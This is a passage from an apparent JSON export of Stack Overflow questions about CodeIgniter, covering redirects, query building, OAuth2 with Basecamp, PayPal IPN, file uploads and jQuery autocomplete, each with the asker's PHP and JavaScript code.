</p>\n\n<p>Thank you.</p>\n\n<p>Version 2 : Now after suggestion from Mr. Michael, I tried to implement it using the redirect function like this : </p>\n\n<p>Default Controller function : home.php</p>\n\n<pre><code>function __construct()\n{\n    // Call the Model constructor\n    parent::__construct();\n    $this-&gt;load-&gt;model('common_model');\n    $this-&gt;handle_redirects();\n}\n\nfunction handle_redirects () \n{\n    $redirects = Array(\n    'gorgeous-girls.php' =&gt; 'home/category_images/9'\n    );\n    $uri = implode('/', $this-&gt;uri-&gt;segments);\n    foreach ($redirects as $from =&gt; $to)\n    {\n        $from = str_replace(':any', '.+', str_replace(':num', '[0-9]+', $from));\n        if (preg_match(\"#^{$from}$#i\", $uri))\n        {\n        if (strpos($to, '$') !== false and strpos($from, '(') !== false)\n            $to = preg_replace(\"#^{$from}$#i\", $to, $uri);\n        redirect($to , 'location', 301);\n        }\n    }\n}\n</code></pre>\n\n<p>And my .htaccess looks like : </p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond $1 !^(index.php|resources|robots.txt)\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n</code></pre>\n\n<p>PS : I have removed index.php from my domain name structure. It looks like : www.example.com/controller/function/uri/uri</p>\n\n<p>Now I am not getting an error page from my host, but I am getting an error page from the CodeIgniter. </p>\n\n<p>Please help. </p>\n"},{"tags":["php","database","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12320249,"title":"Count rows before adding a further limit statement CodeIgniter?","body":"<p>I have ran into a problem...</p>\n\n<p>I have a bunch of where statments like so...</p>\n\n<pre><code>$this-&gt;db-&gt;where('Pool', \"1\");\n$this-&gt;db-&gt;where('Bedrooms &gt;=', \"3\");\n</code></pre>\n\n<p>Then a limit statement</p>\n\n<pre><code>$this-&gt;db-&gt;limit($limit, $offset);\n</code></pre>\n\n<p>And finally my get statement</p>\n\n<pre><code>$query = $this-&gt;db-&gt;get('table-name');\n</code></pre>\n\n<p><strong>My problem is I need to count the results before my limit statement, to get the total rows without the limit.. So I tried this..</strong></p>\n\n<pre><code>$this-&gt;db-&gt;where('Pool', \"1\");\n$this-&gt;db-&gt;where('Bedrooms &gt;=', \"3\");\n\n$num_rows = $this-&gt;db-&gt;count_all_results();\n\n$this-&gt;db-&gt;limit($limit, $offset);\n$query = $this-&gt;db-&gt;get('table-name');\n</code></pre>\n\n<p>This counts my rows with the where statements fine.. However, the get statement now gets records without the previous where statements working.</p>\n\n<p>It's not visible, but there is a large amount of code handling more where statements, and grabbing things in urls, So I'd prefer not to perform the retrieval of data twice in order to fix this...</p>\n\n<p>Cheers!</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12375247,"title":"CodeIgninter - Two Left Joins Results in Connection Reset","body":"<p>Cross posted form the codeigniter forum, where I got crickets.</p>\n\n<p>I’ve got a query which I use two left joins and several inner joins, it consistently returns a connection reset error in firefox and no error message in the apache logs. </p>\n\n<p>If I remove the ‘left’ arguments the same error does not occur, if I run the SQL from $this->db->last_query() directly in the DB adding the LEFT joins back in, it comes back properly (either in phpMyAdmin or commandline).</p>\n\n<p>The \"inner\" arguments don’t need to be passed, I put them in there to experiment.</p>\n\n<pre><code>$this-&gt;db-&gt;select('votes.uid AS voterUID, comments.uid AS voteeUID, voteTypes.id AS voteTypeID, userratingVoter.level AS voterLevel, userratingVotee.level AS voteeLevel');\n\n$this-&gt;db-&gt;from('votes');\n\n# Join the comments table on comments.id = votes.cid\n$this-&gt;db-&gt;join('comments', 'comments.id = votes.cid', 'inner');\n\n# Join the userauth table for admin WHERE clause below\n$this-&gt;db-&gt;join('userauth',  'userauth.uid = votes.uid', 'inner');\n\n# Join the votesTypes table for the WHERE IN clause below\n$this-&gt;db-&gt;join('voteTypes', 'voteTypes.id = votes.voteid', 'inner');\n\n# Join the userrating table twice once for the Voter once for the Votee\n$this-&gt;db-&gt;join('userrating AS userratingVotee', 'userratingVotee.uid = comments.uid', 'left');\n$this-&gt;db-&gt;join('userrating AS userratingVoter', 'userratingVoter.uid = votes.uid', 'left');\n\n# Where in valid Vote Types\n# Valid Vote Types: helpful, interesting, correct, incorrect\n#                   5        4            2        7\n$validVoteTypes = array(5,4,2,7);\n$this-&gt;db-&gt;where_in('votes.voteid', $validVoteTypes);\n\n# Where vote is active.\n$this-&gt;db-&gt;where('votes.active',1);\n\n# Where timestamp is greater than the last run timestamp.\n$this-&gt;db-&gt;where('votes.timestamp &gt;',$lastrun);\n\n# Only standard user votes count, may have to update this if we get other authids\n$this-&gt;db-&gt;where('userauth.authid',2);\n</code></pre>\n\n<p>Broken up SQL from $this->db->last_query()... works in phpMyAdmin and from commandline.</p>\n\n<pre><code>SELECT `votes`.`uid` AS voterUID, `comments`.`uid` AS voteeUID, `voteTypes`.`id` AS voteTypeID, `userratingVoter`.`level` AS voterLevel, `userratingVotee`.`level` AS voteeLevel\n\nFROM (`votes`)\n\nINNER JOIN `comments` ON `comments`.`id` = `votes`.`cid`\nINNER JOIN `userauth` ON `userauth`.`uid` = `votes`.`uid`\nINNER JOIN `voteTypes` ON `voteTypes`.`id` = `votes`.`voteid`\n\nLEFT JOIN `userrating` AS userratingVotee ON `userratingVotee`.`uid` = `comments`.`uid`\nLEFT JOIN `userrating` AS userratingVoter ON `userratingVoter`.`uid` = `votes`.`uid`\n\nWHERE `votes`.`voteid` IN (5, 4, 2, 7)\n AND `votes`.`active` = 1\n AND `votes`.`timestamp` &gt; '2012-03-01 00:00:00'\n AND `userauth`.`authid` = 2\n</code></pre>\n\n<p>Further if I use a standard query instead of the active record syntax, it produces the same results.</p>\n\n<pre><code>$sql = \"SELECT `votes`.`uid` AS voterUID, `comments`.`uid` AS voteeUID, `voteTypes`.`id` AS voteTypeID, `userratingVoter`.`level` AS voterLevel, `userratingVotee`.`level` AS voteeLevel FROM (`votes`) INNER JOIN `comments` ON `comments`.`id` = `votes`.`cid` INNER JOIN `userauth` ON `userauth`.`uid` = `votes`.`uid` INNER JOIN `voteTypes` ON `voteTypes`.`id` = `votes`.`voteid` LEFT JOIN `userrating` AS userratingVotee ON `userratingVotee`.`uid` = `comments`.`uid` LEFT JOIN `userrating` AS userratingVoter ON `userratingVoter`.`uid` = `votes`.`uid` WHERE `votes`.`voteid` IN (5, 4, 2, 7) AND `votes`.`active` = 1 AND `votes`.`timestamp` &gt; '2012-03-01 00:00:00' AND `userauth`.`authid` = 2\";\n\n$query = $this-&gt;db-&gt;query($sql);\n</code></pre>\n\n<p>If I use a standard JOIN instead of LEFT JOIN for either the error does not occur, though it doesn’t return the data I need.</p>\n\n<p><strong>Server Info:</strong></p>\n\n<p>Apache/2.2.14 (Ubuntu)\nPHP/5.3.2\nMySQL 5.1.63\nCodeIgniter 2.1.2</p>\n\n<p>application/config/database.php</p>\n\n<pre><code>$active_group = 'default';\n$active_record = TRUE;\n\n$db['default']['hostname'] = 'localhost';\n$db['default']['username'] = 'some_user';\n$db['default']['password'] = 'some_pass';\n$db['default']['database'] = 'some_db';\n$db['default']['dbdriver'] = 'mysqli';\n$db['default']['dbprefix'] = '';\n$db['default']['pconnect'] = TRUE;\n$db['default']['db_debug'] = TRUE;\n$db['default']['cache_on'] = FALSE;\n$db['default']['cachedir'] = '';\n$db['default']['char_set'] = 'utf8';\n$db['default']['dbcollat'] = 'utf8_general_ci';\n$db['default']['swap_pre'] = '';\n$db['default']['autoinit'] = TRUE;\n$db['default']['stricton'] = FALSE;  \n</code></pre>\n"},{"tags":["codeigniter","node.js","nowjs"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":12213067,"title":"codeigniter & node js integration with now js - how to access view files","body":"<p>i want to integrate codeigniter and node.js but i am having confusion that how to execute \nboth <strong>node.js and codeigniter.</strong>   </p>\n\n<p>I have successfully installed and ran the nowjs sample: <a href=\"http://nowjs.com/doc/example\" rel=\"nofollow\">http://nowjs.com/doc/example</a></p>\n\n<p>how to access view files of codeigniter(or any php framework) into node.js.   </p>\n\n<p>i have confusion because codeigniter executed with url <code>http://localhost/xyz</code> while node.js executed with <code>http://localhost:8080/xyz</code>   </p>\n\n<p>so which url i have to write in browser from which i can use both node.js &amp; codeigniter? </p>\n"},{"tags":["codeigniter","curl","oauth-2.0","basecamp","37-signals"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12374732,"title":"Basecamp API authentication with OAuth2: internal checksum failed error","body":"<p>I'm trying to write a CodeIgniter controller to handle OAuth2 authentication for the 37signals' Basecamp API.</p>\n\n<p>The problem is I keep encountering the 'internal checksum failed' error, when trying to connect (via cURL) to <a href=\"https://launchpad.37signals.com/authorization.json\" rel=\"nofollow\">https://launchpad.37signals.com/authorization.json</a>, providing the Auth Token in a HTTP header.</p>\n\n<p>Here's the index and _authcode functions from my controller class:</p>\n\n<pre><code>&lt;?php \n\n// constants:\n// BC_REQUEST_URL = 'https://launchpad.37signals.com/authorization/new'\n// BC_TOKEN_URL   = 'https://launchpad.37signals.com/authorization/token'\n\n// ... \n\npublic function index() {\n    // if get data is set.\n    if ($this-&gt;input-&gt;get()) {\n\n        // if auth code is provided via GET, switch to _authcode method.\n        if ( $code = $this-&gt;input-&gt;get('code') ) {\n            return $this-&gt;_authcode($code);\n        }\n\n        // On error, kill yourself.\n        if ( $error = $this-&gt;input-&gt;get('error') ) {\n            die($error);\n        }\n\n    }\n\n    // redirect to 37 signals to get an authcode\n    header(\"Location: \".BC_REQUEST_URL.\"?type=web_server&amp;client_id=\".BC_CLIENT_ID.\"&amp;redirect_uri=\".BC_REDIRECT_URL.\"\");\n}\n\n// handles the Authentication code that is returned by 37 Signals.\nprivate function _authcode($code) {\n    // set vars to POST\n    $vars = array(\n        'type' =&gt; 'web_server',\n        'client_id' =&gt; BC_CLIENT_ID,\n        'redirect_uri' =&gt; BC_REDIRECT_URL,\n        'client_secret' =&gt; BC_CLIENT_SECRET,\n        'code' =&gt; $code\n    );\n\n    // make a request for the access_token\n    $url = BC_TOKEN_URL;\n    $c = curl_init($url);\n    curl_setopt($c, CURLOPT_POST, true);\n    curl_setopt($c, CURLOPT_POSTFIELDS, http_build_query($vars));\n    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);\n    $response = json_decode(curl_exec($c));\n    curl_close($c);\n    unset($c,$url);\n\n    // get the access vars from this request\n    $expiry_seconds = $response-&gt;expires_in;    // default: 1209600 (14 days)\n    $refresh_token  = $response-&gt;refresh_token; \n    $access_token   = $response-&gt;access_token;  \n    unset($response);\n\n    // make a separate request to get user info for current user.\n    $url = \"https://launchpad.37signals.com/authorization.json\";\n    $c = curl_init($url);\n\n    curl_setopt($c, CURLOPT_HTTPHEADER, array(\n        \"Authorization: Bearer &lt;$access_token&gt;\",\n        \"Content-Type: application/json; charset=utf-8\",\n        \"User-Agent: MyApp (http://myapp.example.com)\"\n    ));\n    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);\n    $response = json_decode(curl_exec($c)); // reply from 37 signal auth\n    curl_close($c);\n    unset($c,$url);\n\n    echo \"response obj = \" . print_r($response,1);\n    /* prints: response obj = stdClass Object ( [error] =&gt; OAuth token could not be verified. The internal checksum failed, so the token data was somehow mangled or tampered with. ) */\n\n    // get the user data from this request\n    // $expires_at = $response-&gt;expires_at; // the timestamp for when this request expires\n    // $identity   = $response-&gt;identity;   // the current user\n    // $accounts   = $response-&gt;accounts;   // list of accounts we can access\n    // unset($response);\n\n    // store the response data to the database for easy recall.\n    // $this-&gt;db-&gt;query(\"REPLACE INTO `sometable` SET `key1`='value', `key2`='value');\n\n}\n// ...\n?&gt;\n</code></pre>\n"},{"tags":["php","mysql","codeigniter","search"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12375118,"title":"searching partial words from a database","body":"<p>I have a simple mysql search function that searches the titles of entries which I'd like to expand to be able to search against partial words...</p>\n\n<p>For example lets say I search: cancel</p>\n\n<p>currently it will return anything with the word cancel in the title. But ideally it should also return anything with the word cancellation in title.</p>\n\n<p>Here's what I have so far...</p>\n\n<pre><code>function search_title_body($q){\n    $q = '+' . $q;\n    $q = str_replace(' ', '+', $q);\n    $q = \"+(\".$q.\")\";\n\n    $query = \"SELECT *,\n              MATCH(title) AGAINST('$q' IN BOOLEAN MODE) AS score\n              FROM results\n              WHERE (MATCH(title) AGAINST('$q' IN BOOLEAN MODE))\n              AND (published = 1)\n              ORDER BY score DESC\";\n\n    $query = $this-&gt;db-&gt;query($query);\n\n    $results = array();\n\n\n    foreach ($query-&gt;result() as $row){\n        $results[] = $row;\n    }\n\n    return $results;\n} \n</code></pre>\n\n<p>Could anyone point me in the right direction? Thanks a lot for the help :)</p>\n"},{"tags":["php","security","codeigniter","paypal","ipn"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12371833,"title":"Paypal - Securing non-encrypted buttons","body":"<p>I implemented a dynamic button \"buy now\" (not saved in my PayPal account) with IPN and it works fine (yeah!).</p>\n\n<p>Now I have a doubt about his security, because if someone change with firebug (for example) the amount value, the transaction is valid for paypal also if my IPN listener says there is a problem with amount.</p>\n\n<p>My question is \"Can I encrypt the form with a php / codeigniter library?\"</p>\n\n<p>Because I tried to check amount in the IPN listener, but the transaction on paypal continue correctly and It isn't blocked from IPN.</p>\n\n<p>Here, you find a part of my listener code:</p>\n\n<pre><code>private function isVerifiedIPN(){\n\n    $req = 'cmd=_notify-validate';\n    $posts = $this-&gt;input-&gt;post();\n    foreach ($posts as $key =&gt; $value){\n        $value = urlencode(stripslashes($value));\n        $req .= \"&amp;$key=$value\";\n    }\n\n    if($this-&gt;config-&gt;item('SIMULATION'))\n        $url = $this-&gt;config-&gt;item('SIMULATION_URL');\n    else\n        $url = $this-&gt;config-&gt;item('PRODUCTION_URL');\n\n\n    if(!$this-&gt;isVerifiedAmmount() ||\n    !$this-&gt;isPrimaryPayPalEmail() ||\n    !$this-&gt;isNotProcessed()){\n        $req = '';\n    }\n\n    $header = \"POST /cgi-bin/webscr HTTP/1.0\\r\\n\";\n    $header .= \"Host: $url\\r\\n\"; //443\n    $header .= \"Content-type: application/x-www-form-urlencoded\\r\\n\";\n    $header .= \"Content-length: \" . strlen($req) . \"\\r\\n\\r\\n\";\n\n    $fp = fsockopen (\"ssl://$url\", 443, $errno, $errstr, 30);\n\n    if (!$fp)\n    {\n        $this-&gt;sendReport(\"Errore connessione socket\");\n        return FALSE;\n    }\n    else\n    {\n        fputs ($fp, $header . $req);\n        while (!feof($fp))\n        {\n            $res = fgets ($fp, 1024);\n            if (strcmp($res, \"VERIFIED\") == 0)\n            {\n                // transizione valida\n                fclose ($fp);\n                return TRUE;\n            }\n            else if (strcmp ($res, \"INVALID\") == 0)\n            {\n                $this-&gt;sendReport('Transizione non valida');\n                fclose ($fp);\n                return FALSE;\n            }\n        }\n    }\n\n}\n</code></pre>\n"},{"tags":["php","javascript","codeigniter","xmlhttprequest","tankauth"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":188,"score":1,"question_id":12360430,"title":"Handling php redirect in ajax call when codeigniter/tank auth session timeout reached","body":"<p>Hey all I have a javascript function within a codeigniter view that retrieves some information from a codeigniter controller function that is acting strangely when the timeout for a user's session is reached.  Within the called php function I have a statement that looks like this:</p>\n\n<pre><code>  if (!$this-&gt;tank_auth-&gt;is_logged_in()) {\n  redirect(site_url('login'));}\n</code></pre>\n\n<p>This redirects them to my login page if they are not logged in.  However in the javascript function I take the response text and set the contents of a div equal to it.  </p>\n\n<pre><code>  xmlhttp = new XMLHttpRequest();\n  xmlhttp.open(\"POST\", \"mycontroller/myfunction/\", false);\n  xmlhttp.send();\n  document.getElementById(\"mydiv\").innerHTML=xmlhttp.responseText;\n</code></pre>\n\n<p>If the user is logged out when they call this function it will return the login page's responseText and insert it into the div instead of redirecting to the login page.  This looks terrible.  How can I stop it from doing this if the user session times out while looking at this page?  I cannot change the timeout limit because other applications rely upon it.</p>\n\n<p>Really this is not a codeigniter or tank_auth problem at all, simply how to redirect from a php function that is being called in an ajax request instead when I am originally using that function to generate a string for the responseText.</p>\n"},{"tags":["file","codeigniter","upload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":86,"score":-3,"question_id":12365009,"title":"Uploading image in database and file directory codeigniter","body":"<p>this is my controller main.php  this is uploading the file in directory what i want to store the same file name in database and retrieve the image by name. you can tell be the solution code or edit my code really need the code</p>\n\n<pre><code>&lt;?php\n\n       class Main extends CI_controller{ // mian controller\n\n            function index(){\n           $this-&gt;load-&gt;view('main_view.php', array('error'=&gt;''));\n\n                            }\n            function upload(){ // upload function for image\n\n\n\n                         $config['upload_path'] = './images/'; //directory\n                         $config['allowed_types'] = 'jpg|jpeg|gif|png';//type allow\n                         $this-&gt;load-&gt;library('upload',$config);\n\n                            if(! $this-&gt;upload-&gt;do_upload()){\n\n                            $error = array('error'=&gt;$this-&gt;upload-&gt;display_errors());\n                            $this-&gt;load-&gt;view('main_view',$error);\n                                                              }\n                                  else\n                                        {\n        // \n\n                                     $file_data = $this-&gt;upload-&gt;data();\n                                     $data['img'] = base_url().'/images/'. $file_data['file_name'] ;\n                                     $this-&gt;load-&gt;view('success_msg',$data);\n\n\n\n                                         }\n                                                    }\n\n                             }\n ?&gt;\n</code></pre>\n\n<p>this is my view main_view.php</p>\n\n<pre><code> &lt;html&gt;\n    &lt;body&gt;\n\n       &lt;? echo $error;?&gt;\n\n       &lt;? echo form_open_multipart('main/upload'); ?&gt;\n           &lt;input type=\"file\" name=\"userfile\" /&gt;\n           &lt;input type=\"submit\" name=\"submit\" value=\"Upload\" /&gt;\n             &lt;?php echo form_close();?&gt;\n    &lt;/body&gt;\n    &lt;/html&gt;\n</code></pre>\n\n<p>i want to upload file name in database and can easily retrieve the image</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":67,"score":-1,"question_id":12367508,"title":"Better file naming conventions or structure","body":"<p>I create folders and then add files e.g.</p>\n\n<pre><code>folder: orders\nfiles : view.php, add_update.php, invoice.php\nUri becomes: orders/view, orders/add_update, orders/invoice \n</code></pre>\n\n<p>another example</p>\n\n<pre><code>folder: user\nfiles : view.php (view profile), add_update.php (add, update users)\nUri   : users/view, users/add_update\n</code></pre>\n\n<p>and many more folders and files having similar structure. It works fine but in the editor (netbeans) I see the the name of the file only in the tab so that if I have opened <code>order/view.php, users/view.php, files/view.php</code> I see <code>view.php, view.php, view.php</code> ... I can certainly hover over and see the full path but I was wondering if you guys follow a better file naming pattern. I sometime make mistakes when uploading <code>orders/view.php  or users/view.php</code> cos the files structure look so similar. What would you suggest?</p>\n\n<p>PS: These are controllers not the CI view files. One of the reasons I have this structure is to have meaningful uri. I just tagged in CI but it doesn't matter if I am using CI or not.</p>\n"},{"tags":["codeigniter","paypal"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12363863,"title":"Paypal_lib for CodeIgniter 2.x.x","body":"<p>I cant seem to the find where to download the Paypal_lib. Has it been updated for CodeIgniter 2.x.x?</p>\n"},{"tags":["php","jquery","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":361,"score":0,"question_id":10422347,"title":"jQuery UI Autocomplete and CodeIgniter","body":"<p>I am trying to implement a simple autocomplete script using jQuery UI and CodeIgniter 2 but my model keeps telling me there is an undefined variable so I dont know if my setup is right.</p>\n\n<p>My view</p>\n\n<pre><code>$(function() {\n   $(\"#txtUserSuburb\").autocomplete({\n      source: function(request, response){\n         $.ajax({ \n            url: \"autocomplete/suggestions\",\n            data: { \n               term: $(\"#txtUserSuburb\").val()\n            },\n            dataType: \"json\",\n            type: \"POST\",\n            success: function(data){\n               response(data);\n            }\n         });\n      },\n      minLength: 2\n   });\n});\n</code></pre>\n\n<p>My controller</p>\n\n<pre><code>function suggestions(){\n   $this-&gt;load-&gt;model('autocomplete_model');\n   $term = $this-&gt;input-&gt;post('term', TRUE);\n   $rows = $this-&gt;autocomplete_model-&gt;getAutocomplete($term);\n   echo json_encode($rows);\n}\n</code></pre>\n\n<p>My Model</p>\n\n<pre><code>function getAutocomplete() {\n   $this-&gt;db-&gt;like('postcode', $term, 'after'); \n   $query = $this-&gt;db-&gt;get('tbl_postcode');\n   $keywords = array();\n   foreach($query-&gt;result() as $row){\n      array_push($keywords, $row-&gt;postcode);\n   }        \n   return $keywords;\n}\n</code></pre>\n\n<p>There arent any errors except it doesn't seem to be passing the $term variable to the model.</p>\n"},{"tags":["php","jquery-ui","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1281,"score":1,"question_id":5816865,"title":"JQuery ui autocomplete with codeigniter","body":"<p>OK, I am trying to use autocomplete with codeigniter. I did this exact method using regular HTML, JQuery and php an it worked. I tried to modify a bit to make it work with codeigniter but its not working.</p>\n\n<p>The JQuery</p>\n\n<pre><code>$(\"#update-text\").autocomplete({source:\"&lt;?php echo site_url('userProfile/autocomplete');?&gt;\",dataType:\"json\"});\n</code></pre>\n\n<p>The function autocomplete in userProfile controller</p>\n\n<pre><code>function autocomplete(){\n    // this takes the text field and whatever the user writes it autocompletes it.\n    //Every single place and event in the database should be displayed in this view in this format\n\n\n\n    $this-&gt;load-&gt;view(\"source\", $data);\n\n    }\n</code></pre>\n\n<p>The form in the php file</p>\n\n<pre><code>&lt;form method=\"post\" action=\"#\" name=\"updatePlanForm\"&gt;\n&lt;div class=\"ui-widget\"&gt;\n&lt;label for=\"update-text\"&gt;&lt;/label&gt;\n&lt;input type=\"text\" id=\"update-text\" name=\"updateText\" value=\"What are you gonna do today?\" onclick=\"removeText()\"/&gt;\n&lt;/div&gt;\n&lt;input type=\"button\" class=\"small green button\" value=\"Update Plan\" name=\"updatePlanButton\"/&gt; &lt;!-- once clicked JQuery sends a post to a controller send_plan and jquery will return the view --&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>and finally the source php file</p>\n\n<pre><code>&lt;?php\n\n$req = $_GET['term']; //first get the search keyword as get method\n\n$arrResults = array('orange', 'apple', 'bannana');\n\n$array = array_filter($arrResults, 'mycallback');\n//filter the array containing search word using call back function\n\nfunction mycallback($var)\n{\n    global $req;\n    if(preg_match('/^'.$req.'/', $var))\n    {       \n        return $var;\n    }\n}\n\n$array1 = array();\n\n//filter null array\nforeach($array as $arr =&gt; $val)\n{\n        if(!empty($val))\n        {\n                $array1[] = $val;\n        }\n\n}\n\n//echo out the json encoded array\necho json_encode($array1);\n\n?&gt;\n</code></pre>\n"},{"tags":["php","sql","jquery-ui","codeigniter","autocomplete"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":439,"score":1,"question_id":6890882,"title":"jQuery UI Autocomplete not working with codeigniter","body":"<p>I'm trying to get a field on my view to autocomplete with values from a database but can't seem to figure out what is going wrong....</p>\n\n<p>In my view I have the following script:</p>\n\n<pre><code>$(document).ready(function() {\n    $(function() {\n        $( \"#searchQuestion\" ).autocomplete({\n            source: function(request, response) {\n                $.ajax({ url: \"&lt;?php echo site_url('contentmanagement/suggestions'); ?&gt;\",\n                data: { term: $(\"#searchQuestion\").val()},\n                dataType: \"json\",\n                type: \"POST\",\n                success: function(data){\n                    response(data);\n                }\n            });\n        },\n        minLength: 2\n        });\n    });\n});\n</code></pre>\n\n<p>Within my contentmanagement controller I have the \"suggestions\" function:</p>\n\n<pre><code>function suggestions() {\n$this-&gt;load-&gt;model('onlinehelp');\n$term = $this-&gt;input-&gt;post('term', TRUE);\n\nif (strlen($term) &lt; 2)\n    break;\n\n$rows = $this-&gt;onlinehelp-&gt;GetAutocomplete($term);\n\n$keywords = array();\nforeach ($rows as $row)\n    array_push($keywords, $row-&gt;question);\n\necho json_encode($keywords);}\n</code></pre>\n\n<p>And Finally within my model I have the follow function - </p>\n\n<pre><code>function GetAutocomplete($term) {\n        $this-&gt;db-&gt;select('question');\n        $this-&gt;db-&gt;like('question',$term, 'both');\n        $query = $this-&gt;db-&gt;get('question');\n        return $query-&gt;result();\n    }\n</code></pre>\n\n<p>The query above is the equivalent to \"SELECT question FROM question WHERE question LIKE %$term%.</p>\n\n<p>Can anyone see where I am going wrong with this??</p>\n"},{"tags":["php","codeigniter","date"],"answer_count":4,"favorite_count":4,"up_vote_count":4,"down_vote_count":0,"view_count":139,"score":4,"question_id":12365461,"title":"Day difference without weekends","body":"<p>I want to count the total day difference from user input</p>\n\n<p>For example when the user inputs</p>\n\n<p><code>start_date = 2012-09-06</code> and <code>end-date = 2012-09-11</code></p>\n\n<p>For now I  am using this code to find the diffeence</p>\n\n<pre><code>$count = abs(strtotime($start_date) - strtotime($end_date));\n$day   = $count+86400;\n$total = floor($day/(60*60*24));\n</code></pre>\n\n<p>The result of total will be 6. But the problem is that I dont want to include the days at weekend (Saturday and Sunday)</p>\n\n<pre><code>2012-09-06\n2012-09-07\n2012-09-08 Saturday\n2012-09-09 Sunday\n2012-09-10\n2012-09-11\n</code></pre>\n\n<p>So the result will be 4</p>\n\n<p>----update---</p>\n\n<p>i have table contains date,the table name is holiday date</p>\n\n<p>for example the table contains 2012-09-07</p>\n\n<p>so the total day will be 3,because it didnt count the holiday date</p>\n\n<p>how do i do that to equate the date from input to date in table</p>\n"},{"tags":["php","codeigniter","jquery-ajax","autocomplete"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":440,"score":3,"question_id":10811301,"title":"autocomplete in codeigniter","body":"<p>I tried to do autocomplete in codeignter using the code that I got from a site.But it is not working for me.Can anyone find the problem</p>\n\n<p>The view function that I used is given below</p>\n\n<pre><code>&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;title&gt;Autocomplete&lt;/title&gt;\n\n        &lt;script src=\"&lt;?php echo base_url().'js/jquery.autocomplete.js'?&gt;\"&gt;&lt;/script&gt;\n        &lt;script src=\"&lt;?php echo base_url().'js/jquery-1.6.4.js'?&gt;\"&gt;&lt;/script&gt;\n\n        &lt;script type=\"text/javascript\"&gt;\n\n          $(function() {\n          $( \"#username\" ).autocomplete({ //the recipient text field with id #username\n          source: function( request, response ) {\n            $.ajax({\n                url: \"http://localhost/autocomplete/index.php/autocontroller/search_username\",\n                dataType: \"json\",\n                data: request,\n                success: function(data){\n                    if(data.response == 'true') {\n                       response(data.message);\n                    }\n                }\n            });\n        }\n    });\n});\n\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n\n        &lt;h1&gt;Autocomplete&lt;/h1&gt;\n\n        &lt;input type=\"text\" id=\"username\" value=\"\" /&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>\n\n<p>And the controller i have used is given below</p>\n\n<pre><code>&lt;?php\n/* \n * To change this template, choose Tools | Templates\n * and open the template in the editor.\n */\n\n/**\n * Description of autocontroller\n *\n * @author Sivam\n */\nclass autocontroller extends CI_Controller {\n\n    public function  __construct() {\n        parent::__construct();\n         $this-&gt;load-&gt;helper(array('form', 'url'));\n         $this-&gt;load-&gt;database();\n    }\n\n    function index()\n    {\n        $this-&gt;load-&gt;view('autoview');\n    }\n\n    function search_username()\n{\n        $username = trim($this-&gt;input-&gt;get('term', TRUE)); //get term parameter sent via text field. Not sure how secure get() is\n\n        $this-&gt;db-&gt;select('fname');\n        $this-&gt;db-&gt;from('users');\n        $this-&gt;db-&gt;like('fname', $username);\n        $this-&gt;db-&gt;limit('5');\n        $query = $this-&gt;db-&gt;get();\n\n        if ($query-&gt;num_rows() &gt; 0)\n        {\n            $data['response'] = 'true'; //If username exists set true\n            $data['message'] = array();\n\n            foreach ($query-&gt;result() as $row)\n            {\n                $data['message'][] = array(\n                    'label' =&gt; $row-&gt;fname,\n                    'value' =&gt; $row-&gt;fname\n                );\n            }\n        }\n        else\n        {\n            $data['response'] = 'false'; //Set false if user not valid\n        }\n\n        echo json_encode($data);\n}\n\n}\n?&gt;\n</code></pre>\n"},{"tags":["php","javascript","jquery","codeigniter","jquery-plugins"],"answer_count":1,"favorite_count":3,"up_vote_count":2,"down_vote_count":0,"view_count":4283,"score":2,"question_id":2123130,"title":"Autocomplete with jquery and codeigniter php MVC","body":"<p>I'm trying to build an autocomplete using jquery plugin autocomplete from <a href=\"http://jquery.bassistance.de/autocomplete/demo/\" rel=\"nofollow\">this</a> site. </p>\n\n<p>Now I managed to achieve autocomplete using local results pre-loaded into website as a part of document ready function, its quite easy doing it localy.</p>\n\n<p>Here is with what I struggle with, pulling results from php file. Here is how I tried:</p>\n\n<pre><code>$(\"#post_tags\").autocomplete(\"http://localhost/tags/filter\", {\n    width: 260,\n    selectFirst: false,\n    highlight: false,\n    multiple: true,\n    multipleSeparator: \" \",\n    scroll: true,\n    formatItem: function (row, position, totalReturned, searchTerm){\n      return row[0];\n    },\n    formatResult: function(row, position, totalReturned){\n      return row[0].replace(/(&lt;.+?&gt;)/gi, '');\n    }\n }).result(function(event, data, formatted){\n    $(\"&lt;li&gt;\").html( !data ? \"No match!\" : \"Selected: \" + formatted)\n     .appendTo(\"#result\");\n });\n</code></pre>\n\n<p>When I manually go to <code>http://localhost/tags/filter/p</code> I get results php,asp because they contain letter p . </p>\n\n<p>How can I make this work with autocomplete, I mean its quite easy using native php see <a href=\"http://view.jquery.com/trunk/plugins/autocomplete/demo/search.phps\" rel=\"nofollow\">this file</a> , meaning I'm only passing something to the 